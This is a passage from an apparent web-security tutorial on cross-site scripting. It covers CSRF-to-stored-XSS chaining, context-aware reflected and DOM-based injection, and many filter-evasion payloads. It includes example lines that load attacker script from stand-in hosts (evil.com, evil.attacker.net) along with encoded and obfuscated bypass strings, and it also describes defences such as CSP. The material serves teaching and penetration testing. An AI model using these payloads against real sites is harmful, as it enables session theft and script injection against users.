<form action="https://target.com/add_note" method="POST">
  <input name="note" value="<script src='https://evil.com/evil.js'></script>">
  <input type="submit">
</form>
<script>document.forms[0].submit();</script>
```

3. The form silently submits, injecting the XSS into the user's account.

**Additional Notes:** When the malicious form submits:

```
<form action="https://target.com/add_note" method="POST">
  <input name="note" value="<script src='https://evil.com/evil.js'></script>">
</form>
```

The victim's browser sends this request *as if they submitted it themselves*, including:

- Their session cookie (e.g., ```Cookie: session=abc123```)

- Their CSRF token (if present—but in this case, it’s missing)

The ```evil.js``` script isn’t fetched by the server at all. It gets injected into the victim's stored input (like a profile or note), and when the victim later views that input, their browser executes:

```
<script src="https://evil.com/evil.js"></script>
```

That’s a *client-side fetch*, not something the server validates. The browser just blindly loads and executes that script from the attacker's domain—unless modern defenses block it (more on that below).

4. The next time the victim views their note—bam! Self-XSS becomes real XSS.

So, what should the server do?

*For CSRF:*

- Require a valid anti-CSRF token (like a random string in a hidden field or HTTP header)

- Verify it server-side to ensure the request was user-initiated

*For XSS:*

- Sanitize or encode user input before rendering

- Block ```<script>``` tags or anything dynamic from being stored

*For script loading:*

- Use Content Security Policy (CSP) headers like:

```
Content-Security-Policy: script-src 'self';
```

This blocks scripts from external domains like ```evil.com```.

*File Browser Dialogs and ActiveX?*

Injecting a *file picker* dialog with JavaScript was once a neat trick using ```<input type="file">``` elements. While browsers mostly restrict what JS can do with file inputs now, it's still possible to:

```
<input type="file" id="upload">
<script>
  document.getElementById("upload").click();
</script>
```

Why it matters: On older kiosk systems or poorly locked-down browsers, this could break focus, bring up system dialogs, and lead to local file access or exfiltration attempts.

And about the ActiveX stuff? That’s mostly IE-era wizardry, like:

```
<script>
  var shell = new ActiveXObject('WScript.Shell');
  shell.Run('calc.exe');
</script>
```

Modern browsers block this entirely, but legacy systems (kiosks, ATMs, old corporate terminals) may still be vulnerable.

*Myth Busted: "It's just self-XSS"*

Even if a vuln seems to only affect the user who submits it, attackers will find ways to escalate:

- Use CSRF to inject payloads into other users' data.

- Exploit secondary bugs (access control, logging) to get execution elsewhere.

- Abuse XSS for pivoting, info gathering, or breaking hardened UI flows (like kiosks).

Rule of thumb: Any XSS = potential compromise. Always patch, no matter how harmless it looks.

## Finding and Exploiting XSS Vulnerabilities:

One of the simplest ways to test for cross-site scripting vulnerabilities is by submitting a basic proof-of-concept (PoC) payload, like:

```
<script>alert(document.cookie)</script>
```

This payload attempts to trigger a browser alert displaying the user's cookies—demonstrating that your script is being executed within the page. To detect XSS, you would *submit this payload in every user-controllable parameter on each page of the application*—URL query strings, form fields, headers (like ```User-Agent``` or ```Referer```), and even cookies—then monitor the server's response for any place where the payload appears unencoded and unescaped.

This means systematically testing all parameters in all routes. For example, if ```https://site.com/search?q=term``` exists, try ```q=<script>...```. If ```https://site.com/profile?user=123```, try the same. Think: GET/POST/PUT bodies, hidden fields, URL fragments—*anywhere your input reflects back.*

Note: *Automated Tools vs Manual Testing:*

While manual fuzzing gives you fine control, automated tools can speed up discovery. Popular options include:

- Burp Suite (Community/Pro) – Has built-in active scanners for XSS, with DOM fuzzing in Pro.

- OWASP ZAP – Free and open-source, includes XSS scanners and scripting support.

- Dalfox – Fast, powerful XSS scanner built for automation.

- XSStrike – Payload generator + filter evader, great for bypassing bad WAFs.

Tools like Nikto or Wapiti are more general-purpose vulnerability scanners and are less effective for finding complex XSS issues. They might catch very basic reflected bugs, but not DOM-based ones or ones behind form logic or JS-heavy flows.

**Bypassing Filters and Blacklists:**

Many apps try to block XSS with weak filters that remove ```<script>``` or disallowed characters. But attackers often bypass this with creative obfuscation. For example:

- Malformed tag closure to bypass naive blacklists:

```
"xscript >alert(document.cookie)</script >"
```

- Tag injection with case manipulation:

```
"><ScRiPt>alert(document.cookie)</ScRiPt>
```

- URL-encoded payload:

```
"%3e%3cscript%3ealert(document.cookie)%3c/script%3e "
```

- Tag-splitting to confuse parsers:

```
<scr<script>ipt>alert(document.cookie)</scr</script>ipt>
```

- Null byte injection (in legacy interpreters this may terminate strings early)

```
%00"><script>alert(document.cookie)</script>
```

Even if the server filters, sanitizes, or encodes your payload, quirks in *browser rendering* may still allow code execution, especially in browsers that decode on the fly or in complex templating environments. Always test how the *final rendered output behaves in the browser*, not just what the server returns.

**DOM-Based XSS Evasion:**

DOM-based XSS adds an extra challenge: your payload won’t show up in the server response at all, since it lives entirely in the *browser’s DOM*, triggered by client-side JavaScript reading the URL or user input. For example:

```
let userMessage = location.hash.substring(1); // attacker-controlled
document.write(userMessage); // XSS when visiting: site.com/page#<script>...
```

Detection here requires:

- A browser-based proxy or extension (like Burp’s DOM Invader, or custom Puppeteer scripts)

- Manual JavaScript source review

- Watching JS read from ```location```, ```document.referrer```, ```window.name```, or cookies

*What's going on:*

- ```location.hash.substring(1)```: This grabs the part after the # in the URL. So for ```site.com/page#<script>alert('xss')</script>```, it pulls out ```<script>alert('xss')</script>```. This part is not sent to the server—it's purely client-side.

- ```document.write(userMessage)```: This blindly injects the value into the page’s HTML. So the browser sees and executes the script tag: boom, XSS.

*The actual payload:*

```
#<script>alert('xss')</script>
```

You stick this onto the end of the URL. No POST, no query string, no server involvement—just a rogue ```hash fragment```.

*Moral of the payload:*

You don't need to touch the server at all—just hijack how client-side code *trusts* what's in the URL. This makes it sneaky, hard to log, and very effective in modern single-page apps. Always treat anything from ```location``` as suspect unless explicitly sanitized.

### Finding and Exploiting Reflected XSS Vulnerabilities:

The most reliable way to detect reflected XSS vulnerabilities is to methodically test every input point you identified during the application mapping phase. Here’s a streamlined step-by-step process:

1. Submit a benign alphabetical string in each entry point:

Use a clearly unique, harmless test string like:

```
myxsstestdmqlwp
```

Stick to alphabetical characters to avoid triggering any initial filters or input sanitation. Submit this string to every single parameter, one at a time, using both ```GET``` and ```POST```.

2. Identify all locations where this string is reflected in the response:

Carefully inspect the response pages for any reflection of your string. These reflections may appear:

- Inside HTML body content

- Within attribute values (like ```<input value="...">```)

- Inside ```<script>``` blocks

- In inline event handlers (like ```onclick="..."```)

- Even inside comments or CSS

3. Understand the syntactic context of the reflection:

Syntactic context means: *Where exactly is your input being placed in the HTML structure?*

Here are some common contexts:

- HTML body context:

If your string appears in plain text like:
 
```
<p>Hello myxsstestdmqlwp</p>
```

Then injecting tags like ```<script>``` may work directly.

- HTML attribute context:

If it appears inside a tag attribute, like:

```
<input value="myxsstestdmqlwp">
```

You’ll need to break out of the attribute, like:

```
" onfocus="alert('XSS')
```

*Additional Notes:* Assume this is the server-side generated HTML:

```
<input value="[USER_INPUT]">
```

Now if you inject just:

```
myxsstestdmqlwp
```

...you’ll get:

```
<input value="myxsstestdmqlwp">
```

Which is totally safe.

Now, let’s break out. You inject:

```
" onfocus="alert('XSS')
```

Now the result becomes:

```
<input value="" onfocus="alert('XSS')">
```

This closes the ```value``` attribute early with the first ```"```...

Then adds a new attribute: ```onfocus="alert('XSS')"``` — which is a valid event handler. So when a user focuses the input (e.g., clicks or tabs into it), your JavaScript gets executed.

*Why This Works:* HTML allows multiple attributes on a tag. ```onfocus```, ```onclick```, ```onmouseover```, etc., are all event attributes. If you break out of one attribute and inject another, the browser happily interprets it.

- JavaScript context:

If reflected inside a ```<script>``` block:

```
<script>var msg = 'myxsstestdmqlwp';</script>
```

You’ll need payloads that escape the string and inject new script logic. Understanding this is crucial—because your payload must fit the context to execute.

4. Inject tailored payloads and test execution:

Craft an appropriate payload for each reflection based on its context. If your payload is sanitized or blocked, study how the filter works and try to bypass it using encoding, nesting, or obfuscation tricks (like broken tags or character entities). Example evasions:

```
"><script>alert(1)</script>
<svg/onload=alert(1)>
%3cscript%3ealert(1)%3c/script%3e
```

Also test these in both GET and POST methods. For POST-only payloads, try switching to GET with tools like Burp Suite’s “Change request method” to expand your exploitability options.

5. Don’t forget the HTTP headers:

Some apps copy values from request headers (like ```Referer``` or ```User-Agent```) into the response—especially in error messages or debug pages. Example:

```
User-Agent: <script>alert(1)</script>
```

This is a potential reflected XSS vector if it lands unsanitized in the response.

Flash is dead, but this doesn’t matter—because modern JS can forge these headers using techniques like [Fetch with custom headers](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API). So while embedding in Flash is outdated, manipulating headers is still very possible—especially in server-side SSRF chains or admin panel trickery.

Reflected XSS is all about finding where user input bounces back in the response—and then carefully crafting a payload that *fits the syntax* of that reflection. Even if basic scripts are blocked, *context-aware payloads and clever bypasses* can often crack through the defenses. Don’t overlook headers, strange parameters, or POST-only routes—every echo is a potential echo chamber of doom.

### Testing Reflected Inputs to Trigger Script Execution:

Once you’ve identified where user-supplied input is being reflected in the application’s response, the next phase is to determine whether that reflection is exploitable. This means crafting payloads that fit the syntactic context of the reflected input and attempting to execute arbitrary JavaScript. Let’s walk through some common scenarios.

*Example 1: Inside an HTML Tag Attribute*

Suppose the application renders:

```
<input type="text" name="address1" value="myxsstestdmqlwp">
```

Your input is inserted inside a quoted attribute. The basic idea is to *break out of the attribute* and inject either your own tag or an event handler.

- Basic breakout:

```
"><script>alert(1)</script>
```

- Stealthier variation using an event handler inside the tag:

```
" onfocus="alert(1)
```

Result:

```
<input type="text" name="address1" value="" onfocus="alert(1)">
```

When the user focuses the field (e.g., clicks into it), your script runs.

*Example 2: Inside a JavaScript String*

Suppose you find this in the response:

```
<script>var a = 'myxsstestdmqlwp'; var b = 123;</script>
```

Your input lands inside *a JavaScript string literal*, so your payload should:

1. Close the quote,

2. End the statement with a semicolon,

3. Inject your code,

4. Optionally restore structure to prevent errors.

Payload:

```
'; alert(1); var foo='
```

Resulting output:

```
<script>var a = ''; alert(1); var foo=''; var b = 123;</script>
```

Alternative: use ```//``` to comment out any remaining code:

```
'; alert(1); //
```

*Example 3: Inside a URL Attribute*

Suppose the app reflects input inside this tag:

```
<a href="myxsstestdmqlwp">Click here</a>
```

You can inject JavaScript directly using the ```javascript:``` URI scheme:

```
<a href="javascript:alert(1)">Click here</a>
```

Most browsers will still execute this if the attribute is reflected unfiltered.

Another sneaky way: *invalid ```href``` with event handler:*

Or inject both:

```
<a href="javascript:alert(1)" onmouseover="alert(1)">Hover me</a>
```

*Steps to Validate Each Reflection:*

1. Search HTML Source

Find every instance of your test string in the HTML and note their exact positions.

2. Handle Multiple Occurrences

Treat each reflection as its own possible vector — one might be harmless, another exploitable.

3. Analyze the Context

Is your string inside an HTML attribute? In a JavaScript snippet? In plain text? Tailor your payload to match the context.

4. Submit and Observe

Use classic ```alert(1)``` for proof-of-concept. If it pops, it's game on. If not, refine your syntax or try alternate injection vectors.

*Extra Notes:*

- Encode special characters like ```&```, ```=```, ```+```, ```;```, and space when submitting payloads via the URL or form fields.

- Don't forget POST parameters and even headers like ```Referer```, ```User-Agent```, or ```X-Forwarded-For```. Modern tools like Burp Suite or OWASP ZAP can help intercept and tamper with those.

- As said before, Flash is dead, but manipulating headers is still very much alive — for instance, a web server reflecting ```User-Agent``` inside error messages can be vulnerable to reflected XSS even today.

## Probing and Bypassing Defensive Filters:

When your XSS payload fails to execute, don't give up—assume the server is trying to protect itself and dig in. Defensive filters are often clumsy, brittle, or incomplete. The key to winning is to identify what kind of processing the server is doing and then adapt your payload to slip through. There are three broad categories of defensive behavior:

1. *Signature-Based Filtering (WAFs or server frameworks)*

In this case, the server or a Web Application Firewall (WAF) blocks input outright when it detects certain patterns—typically attack signatures like ```<script>``` or ```onerror=```. You might get an error message or a different response than with harmless inputs. A real-world example of this would be Microsoft's ASP.NET validation system:

Sample Error (Formatted):

```
Server Error in '/' Application.

A potentially dangerous Request.Form value was detected from the client 
(searchbox="<asp").

Description:
Request validation detected a potentially dangerous input value and aborted processing. 
This value may indicate a cross-site scripting (XSS) attempt.

Recommendation:
To disable request validation, set validateRequest="false" in the Page directive or configuration.
However, you should perform explicit input validation in your code.

Exception Details:
System.Web.HttpRequestValidationException: A potentially dangerous Request.Form value 
was detected from the client (searchbox="<asp").
```

**Bypassing Signature Filters:**

If you hit this kind of wall, your next move is to probe the filter:

1. Isolate the trigger. Start removing parts of your input until it’s accepted.

2. Once you find the triggering pattern (like ```<script>), try different payloads using:

- HTML obfuscation (```<scr<script>ipt>```)

- Case manipulation (```<ScRiPt>```)

- Encoded characters (```%3Cscript%3E```)

- Alternative event handlers (```onmouseover```, ```onfocus```)

- Breaking context (like ```" onclick="alert(1)``` inside attributes)

Pro tip: Modern browsers are very forgiving. You don’t need perfect syntax. If the browser renders the DOM and interprets your JavaScript, it’s a win—even if the HTML looks broken.

2. *Input Sanitization / Encoding*

Some apps don't block the input, but modify it—removing or encoding certain characters or tags before storing or reflecting them. For example:

- ```<script>alert(1)</script>``` might become:

```
&lt;script&gt;alert(1)&lt;/script&gt;
```

…and now it just displays as text instead of executing.

You’ll need to:

- Look for *partial sanitization* (e.g., ```<script>``` stripped, but event handlers left intact)

- Explore *bypass vectors* like using malformed HTML or attributes (e.g., ```<svg onload=alert(1)>```)

- Leverage *double encoding* or *mixed encoding* tricks (like using ```%25``` for ```%```)

3. *Input Truncation*

Some applications silently cut off input after a certain length, which might break your payload. For example:

```
"><script>alert(1)</script>
```

might become:

```
"><script>alert(1)
```

Which results in *no closing tag*, and thus *no script execution.*

**Fix:**

- Use shorter payloads (```<img src=x onerror=alert(1)>```)

- Use DOM-based injection with ```location.hash``` or ```document.URL``` if input is used client-side

*Moral of This Story:* Filters are often dumb and predictable. Your job is to probe them with surgical precision. Signature-based? Obfuscate. Sanitization? Find a crack. Truncated? Simplify.

## Ways of Introducing Script Code:

XSS isn’t just about ```<script>alert(1)</script>```. There are dozens of sneaky, creative, and often browser-specific ways to introduce JavaScript execution into a page. Below is a breakdown of the four broad categories for introducing script code—updated for modern-day browsers, with comments and examples fixed and expanded where needed.

1. *Script Tags (Standard & Encoded Variants):*

Using ```<script>``` is the most direct and classic method. But thanks to WAFs and filters, attackers started getting clever. You can use alternative MIME handlers like ```data:``` URLs or ```base64``` encoding to bypass pattern-matching filters.

These tricks still work in browsers if *CSP headers aren't present*, and *if input isn’t sanitized*. However, many modern browsers block execution of inline JavaScript from ```data:``` URIs by default (especially Chrome and Firefox). Still, older or misconfigured apps may fall for it.

*Note on CSP Headers:*  Content Security Policy (CSP) headers are a powerful browser-side defense that restricts what kinds of content can be loaded or executed on a page. A properly configured CSP can block inline scripts, disallow ```data:``` URIs, prevent loading scripts from untrusted domains, and significantly reduce the impact of XSS vulnerabilities. However, many web apps either misconfigure it or skip it entirely, making XSS exploits much more feasible.

**Examples & Commentary:**

```
<!-- Direct injection using a data URI with inline script -->
<object data="data:text/html,<script>alert(1)</script>"></object>
```

Potentially blocked by CSP, but still useful on apps without it. Bypasses filters looking for ```<script>``` in plain text.

```
<!-- Base64-encoded script tag, embedded in a data URI -->
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
```

Bypasses simple regex filters by hiding ```<script>``` entirely in encoded form.

```
<!-- Embedded in a clickable link instead of an object -->
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click here</a>
```

Combines trickery and user interaction. Useful in phishing or social engineering setups.

2. *Event Handlers:*

If you can’t get a ```<script>``` tag in, try event-based execution. These execute JavaScript in response to various browser events like clicks, focus, scrolls, and even tag-specific changes.

Many of these still function in modern browsers. Some have been nerfed, especially ```onreadystatechange``` (deprecated outside IE), and anything IE/ActiveX-specific like ```<xml>```, ```<bgsound>```, or ```onpropertychange```.

**Notable Working Examples (2025):**

```
<img src=x onerror=alert(1)>
```

Classic. Still works. Many filters look for ```<script>```, but not ```onerror```.

```
<iframe onload=alert(1)>
```

Still viable. Triggers when iframe loads—even a blank one.

```
<input autofocus onfocus=alert(1)>
```

Uses the HTML5 ```autofocus``` attribute to trigger ```onfocus``` without user interaction. Works great on page load.

```
<body onscroll=alert(1)>
  <div style="height: 2000px;"></div>
</body>
```

User scroll triggers it. Combine with auto-scrolling or CSS tricks to force execution.

```
</a onmousemove=alert(1)>
```

HTML5 weirdness: event handlers in closing tags. Still parsed in some contexts!

```
<audio src=x onerror=alert(1)>
<video src=x onerror=alert(1)>
```

Modern HTML5 tags, rarely filtered. Useful in payloads targeting newer apps.

**Deprecated or Dead Payloads (RIP Flash & IE):**

The following are mostly dead in modern browsers, but still worth knowing in case you're testing legacy enterprise software (which often lingers in dusty corners of internal networks):

- ```<xml onreadystatechange=...>```

- ```<bgsound onpropertychange=...>```

- ```<script onreadystatechange=...>```

- ```<object onerror=...>```

- ```<isindex ...>``` ← this tag is obsolete and mostly unsupported

- ```onbeforeactivate```, ```onfocusin```, etc. ← mostly IE-only

Legacy gold. Still juicy if you're hacking an old government app or a crusty internal SharePoint.

**Tips for Payload Crafting:**

- URL-encode characters like ```<```, ```>```, ```=```, ```"```, ```'```, ```/```, ```;```, and space when needed.

- Context matters: know if your payload lands inside an attribute, a tag, a script block, or even a comment.

- Combine vectors for filter evasion: e.g., ```<svg><desc><![CDATA[<script>alert(1)</script>]]></desc></svg>```

*Moral of This Story:* HTML is chaotic, browsers are forgiving, and filters are usually dumb. You're threading the needle through syntax chaos, browser quirks, and half-baked defenses.

### Script Pseudo-Protocols:

A pseudo-protocol lets you put executable code where a browser normally expects a URL. The classic example is the ```javascript:``` scheme:

```
<iframe src="javascript:alert(1)"></iframe>
<object data="javascript:alert(1)"></object>
<embed  src="javascript:alert(1)"></embed>
```

When the element tries to “load” that URL, the browser evaluates the JavaScript instead.

*Modern reality (2025):*

```
| Browser               | `javascript:` in most URL-type attributes                         | Notes                                                      |
| --------------------- | ----------------------------------------------------------------- | ---------------------------------------------------------- |
| Chrome / Edge (Blink) | **Still executes** unless blocked by CSP or sandbox attributes.   | Mixed-content warnings can also intervene.                 |
| Firefox               | **Still executes.**                                               | Same CSP caveats.                                          |
| Safari                | **Executes**, but WebKit blocks it in some inline-style contexts. |                                                            |
| IE11 / Legacy Edge    | Executes.                                                         | (IE security zones/Enhanced Protected Mode may interfere.) |
```

*Lesser‑known schemes:*

- ```vbscript:``` — Worked only in IE <= 11 and only if VBScript wasn’t disabled. Dead in Chromium‑based Edge and all modern browsers. Still pops on a handful of dusty intranet apps running IE mode.

- ```data:text/html;base64,...``` — Not technically a script protocol, but achieves the same thing by inlining a mini HTML page that contains script.

*HTML5 quirks & filter bypass:*

HTML 5 introduced tag names with hyphens (custom elements), so regex filters that only allow ```[A-Za-z]+``` can miss them. Example payloads:

```
<!-- Forged form/button combo -->
<form id="test"></form>
<button form="test" formaction="javascript:alert(1)">X</button>

<!-- Obsolete draft tag but great for bypass demos -->
<event-source src="javascript:alert(1)"></event-source>
```

Even if ```event-source``` isn’t recognised, most browsers still parse the attributes and attempt to “load” the source.

*Dynamically-Evaluated Styles:*

- ```expression()``` (IE ≤8, Quirks/Compat mode): Mostly extinct. Still fires in legacy enterprise IE11‑compat if the page runs in Quirks or IE7 standards mode.

- ```behavior:url(#default#time2)``` with ```onbegin```: IE-only & dying. Requires VML Time behavior; works in IE9-11 but not Edge/modern.

- ```-moz-binding: url(xbl.xml#whatever)```: Removed (Firefox 70+). No longer usable for XSS.

Bottom line: CSS-based execution is now largely relegated to legacy environments. For contemporary targets, stick with JavaScript URLs, event handlers, SVG/MathML tricks, or DOM-based injections.

*Additional Notes:* Dynamically-evaluated styles are special CSS properties that can *run code*—especially JavaScript—*at render time* rather than just styling an element.

1. ```expression()``` – IE’s dark magic:

```
<div style="width: expression(alert('XSS'));">
```

Used in IE ≤ 8, ```expression()``` allowed you to write JavaScript directly inside CSS properties. It was meant for *dynamic layout logic*, but attackers quickly realized you could just trigger any JS you wanted.

When it runs: Every time the style is recalculated (scrolling, resizing, etc.).

Modern status: Deprecated and disabled in IE9+, unless the page runs in compatibility mode (Quirks or IE7 mode).

2. ```behavior:url(#default#time2)``` + ```onbegin```:

```
<x style="behavior:url(#default#time2)" onbegin="alert('XSS')"></x>
```

This invokes *VML (Vector Markup Language)* behavior in IE—another Microsoft-only weirdness. By assigning a “behavior” to the tag, you could make it act like a multimedia element and react to timeline events like ```onbegin```.

When it runs: As soon as the element’s behavior is triggered (automatically in many cases).

Modern status: Only works in IE9–11. Dead in Edge and everywhere else.

3. ```-moz-binding``` – Firefox’s old exploit door:

```
div {
  -moz-binding: url("xbl.xml#xss");
}
```

This was a Firefox-only CSS property that loaded *XBL (XML Binding Language)* files, which could contain JS. You’d host a malicious XBL file that binds script to elements when rendered.

Modern status: Removed entirely as of Firefox 70+. Now useless for XSS.

These tricks let attackers sneak *script execution into places that aren’t ```<script>``` tags*—especially in apps with script tag filtering. While these methods are mostly obsolete today, they’re still important when:

- Testing old internal or intranet apps

- Looking for filter bypass examples

- Learning how browsers used to behave under adversarial input

*Quick “Moral of the Story”:*

- ```javascript:``` is still a workhorse payload—unless CSP says otherwise.

- Legacy schemes (```vbscript:```, ```expression()```, VML behaviors) matter only when you’re hacking crusty intranets stuck on IE.

- Hyphenated or custom-element tag names (```event-source```, ```my-tag```) slip past old regex filters.

- Always test in the browser—specs change, but creative payloads survive.

HTML, CSS, and JS were *never designed with security in mind.* So any place the browser *interprets input dynamically*—even a style!—can be a secret attack vector.

## Bypassing Filters: HTML

When attempting an XSS exploit, you’ll often run into *signature-based filters* designed to block known attack patterns—typically by matching HTML components like tag names, attributes, or values against regular expressions. These filters can often be defeated through *HTML obfuscation*, introducing unusual but valid syntax that browsers interpret normally, but filters fail to catch. Let’s look at how.

Start simple:

```
<img onerror=alert(1) src=a>
```

This triggers an alert when the image fails to load.

### Obfuscation Techniques:

#### 1. Tag Name Casing:

HTML is case-insensitive for tag names and attributes. So you can bypass basic filters by changing the case:

```
<iMg onerror=alert(1) src=a>
```

Some lazy filters might only look for ```<img>```.

#### 2. NULL Byte Injection:

```
<%00img onerror=alert(1) src=a>
<i%00mg onerror=alert(1) src=a>
```

Explanation: ```%00``` is a URL-encoded NULL byte (```\x00```). Many C/C++-based parsers treat this as a *string terminator*—so filters written in native code (like many WAFs) might stop reading at the NULL, and never see the malicious part. Also, URL-encode ```%00``` in the actual request. This trick is IE-specific, but can sometimes work against server-side filters (not the browser itself).

#### 3. Unknown Tag Names + Event Handlers:

Even if known tags like ```<img>``` are filtered, most browsers will happily parse *unknown HTML tags* and still execute their event handlers:

```
<x onclick=alert(1)>Click here</x>
```

This bypasses filters that only block known dangerous tags like ```<script>```, ```<img>```, etc. You’re effectively inventing your own tag, but event handlers will still work.

#### 4. Base Tag Hijacking:

The ```<base>``` tag defines *a base URL* used by the browser to resolve all *relative links* and ```<script src="...">``` calls that follow. If you can inject this:

```
<base href="http://evil.attacker.net/">
<script src="goodscript.js"></script>
```

Then this seemingly safe ```<script>``` tag fetches the file from:

```
http://evil.attacker.net/goodscript.js
```

That means the attacker controls the JavaScript *executed in the victim's context.*

**Modern Realities:**

Firefox and Chrome still parse ```<base>``` tags even if injected *outside the* ```<head>```, which makes this attack viable even in reflected contexts. *Only the first* ```<base>``` tag is honored by the browser, so it’s a race to inject yours before any real one is parsed. Mitigation: Use Content Security Policy (CSP) to whitelist trusted script sources.

*Why This Matters:*

Filters often operate on rigid assumptions like:

- All dangerous tags are ```<script>``` or ```<img>```

- Tags follow a specific format

- Only real tag names are used

Reality? Browsers are lenient. Filters are not clairvoyant. So by:

- Switching casing

- Inserting NULL bytes

- Inventing your own tags

- Hijacking relative script loading…

You slip past these filters and get full XSS control.

Filters that block known attack strings often rely on predictable patterns: normal tag syntax, whitespace, specific attribute order, etc. But HTML and browsers are way more permissive than that—so let’s look at clever syntax mutations that help your payload sneak through.

#### 5. Characters Instead of Whitespace After Tag Name:

Browsers don’t always require a space between the tag name and the first attribute. You can use different characters or even junk:

```
<img/onerror=alert(1) src=a>
<img%09onerror=alert(1) src=a>    ← %09 = tab
<img%0Aonerror=alert(1) src=a>    ← %0A = line feed
<img%0Donerror=alert(1) src=a>    ← %0D = carriage return
<img/"onerror=alert(1) src=a>     ← double quote
<img/'onerror=alert(1) src=a>     ← single quote
<img/anything/onerror=alert(1) src=a> ← garbage in between works
```

Why it works: Browsers are lenient, and many HTML parsers normalize these into valid tag structures. Meanwhile, filters may only expect whitespace. Try combining these with weird tag cases too: ```<iMg%09onerror=...>```

Also, if you’re targeting ```<script>```, try this:

```
<script/garbage>alert(1)</script>
```

Super simple filters that expect ```<script>``` and then nothing else will miss this one.

#### 6. Obfuscating Attribute Names:

If a filter blocks event handlers like ```onerror=```, use a *NULL byte* to break the match:

```
<img o%00nerror=alert(1) src=a>
```

Explanation: ```%00``` = NULL byte. If the filter uses a native string function to check for ```"onerror"```, the NULL may terminate it early. Caveat: This only works on older browsers or badly written WAFs that don’t process the whole string correctly.

#### 7. Obfuscating Attribute Delimiters:

Attributes can be wrapped in:

- Double quotes: ```"```

- Single quotes: ```'```

- Or even backticks (in IE): ``` ` ```

```
<img onerror="alert(1)" src=a>
<img onerror='alert(1)' src=a>
<img onerror=`alert(1)` src=a>   ← IE-only
```

Filters that don’t recognize all these as valid delimiters may allow the payload.

Reordering attributes for extra chaos:

```
<img src='a' onerror=alert(1)>
```

Simple filters might only look for attributes *starting* with ```on```, and ignore this.

#### 8. Obfuscating Attribute Values:

You can do a lot of chaos inside attribute values.

**A. NULL Byte Trick:**

```
<img onerror=a%00lert(1) src=a>
```

Purpose: Again, WAFs or filters using C-style strings may be tricked into thinking ```onerror=a``` is all there is.

**B. HTML Encoding:**

HTML entities are decoded by the browser before JS is interpreted:

```
<img onerror=a&#x6c;ert(1) src=a>   ← &#x6c; = 'l'
```

Decoded, this becomes:

```
<img onerror=alert(1) src=a>
```

You can go wild with variations:

```
<img onerror=a&#108;ert(1) src=a>         ← decimal
<img onerror=a&#0108;ert(1) src=a>        ← leading 0
<img onerror=a&#x006c;ert(1) src=a>       ← hex, padded
<img onerror=a&#x0006c;ert(1) src=a>      ← even more padding
<img onerror=a&#108ert(1) src=a>          ← mix of entity + plain text
```

Moral of the story: Many filters only decode once, or not at all. Browsers don’t care. If the resulting string makes sense to the browser after decoding, it’s game on.

**Sneaky Iframe Example:**

```
<iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29;>
```

Decoded, it becomes:

```
<iframe src=javascript:alert(1)>
```

If a filter tries to block ```javascript:``` but doesn’t decode entities, it’ll miss this completely.

*Wrap-Up:*

- Tags can be mutated: casing, NULL bytes, or invented.

- Attributes can be reordered, encoded, or wrapped in strange quotes.

- Values can be encoded and still execute if they decode into valid JS.

- Spaces aren’t mandatory; garbage between tag name and attribute can still work.

#### 9. Tag Brackets:

In some situations, quirky browser behavior and non-standard application logic allow malicious HTML tags to sneak past input filters—even when they appear to be malformed. This category of XSS filter bypass techniques takes advantage of improper decoding, Unicode normalization, or loose browser parsing.

**Double URL Decoding Trick:**

Some applications mistakenly apply URL decoding *more than once*, which can be weaponized. Consider the following input in a request:

```
%253cimg%20onerror=alert(1)%20src=a%253e
```

- ```%25``` is the encoding for ```%```

- So ```%253c``` becomes ```%3c```, which becomes ```<```

The first decoding by the server gives:

```
%3cimg onerror=alert(1) src=a%3e
```

Since ```%3c``` (```<```) and ```%3e``` (```>```) aren't actual tag characters yet, some filters don’t flag it. Then the *second decoding* transforms it into:

```
<img onerror=alert(1) src=a>
```

If this is reflected into the page, boom—code execution.

**Unicode Glyph Confusion:**

Another sneaky approach is using *visually similar Unicode characters* instead of actual tag brackets:

```
«img onerror=alert(1) src=a»
```

Here, ```«``` (```\u00AB```) and ```»``` (```\u00BB```) resemble angle brackets. If the framework maps them back to ```<``` and ```>```—either automatically or during HTML rendering—the browser will interpret this as a valid tag. This relies heavily on how the application or front-end templating engine handles character normalization. It doesn’t always work, but it’s enough of an edge case to catch devs off guard.

**Extra Brackets Bypass:**

Some filters match tags based purely on the ```<tag>...</tag>``` pattern. You might get past them by *misusing extra brackets*, which browsers tend to ignore:

```
«script>alert(1);//«/script>
```

Let’s break that one down:

- The filter sees the string and looks for ```<...>```, but doesn’t recognize ```«...«/script>``` as a valid ```<script>``` block.

- But *the browser*, in its beautiful chaos, *autocorrects* or *normalizes* the input. It sees something that resembles a ```<script>``` block and tries to execute it anyway.

- Most modern browsers are extremely forgiving—so even if it's malformed, they'll reconstruct the DOM in a way that makes the JavaScript inside run. The success of this trick depends on how forgiving the browser is and how naïve the input filter is.

**E4X (ECMAScript for XML) Abuse:**

This one is especially weird:

```
<script<{alert(1)}/></script>
```

This doesn't even look valid! So what the heck is happening?

E4X, or *ECMAScript for XML*, was an extension to JavaScript that allowed XML-like syntax. In Firefox (pre-ES6), this would be parsed in a specific way that tolerated odd combinations of JavaScript and XML-like tokens.

While modern browsers no longer support E4X (deprecated and removed), the point here is that *odd parsing rules can be abused* to sneak in JavaScript even when the tags look broken. As of 2025, don’t expect this exact trick to work anymore—but the lesson stands: parsers can be weird, and legacy behaviors can linger in niche engines or older platforms.

*Generated Source in Firefox:*

To analyze how the browser *actually interprets* the malformed HTML, it helps to view the generated DOM—not just the raw source:

- Right-click the element → *Inspect*

- Switch to the *Inspector* tab

- You can view the cleaned-up/generated HTML structure the browser builds in real time

For deeper analysis:

- View → Developer → Inspector

- Or press *Ctrl+Shift+C*

*Wrap-Up:*

Browsers don’t follow rules—they improvise. They “autocorrect” broken HTML, guess your intent, and piece together malformed inputs into something executable. This can be a blessing for user experience—and a playground for hackers. When filters rely on basic string matching or naive blacklists, they fail to account for decoding quirks, Unicode normalization, and inconsistent parsing between server and client. Your job as an attacker? Ride that chaos like a thunderstorm.

#### 10. Character Sets and Bypassing Filters:

In some situations, a powerful way to bypass input filters and protections is to encode your attack payload using a nonstandard or unexpected character set. This technique often works because many filters are designed to detect known malicious patterns in *normalized*, common formats (like UTF-8 or ASCII). If you disguise the payload using an alternative encoding, you may sneak past those defenses.

**Example:** Alternative Encodings of an XSS Payload

Take the classic JavaScript XSS payload:

```
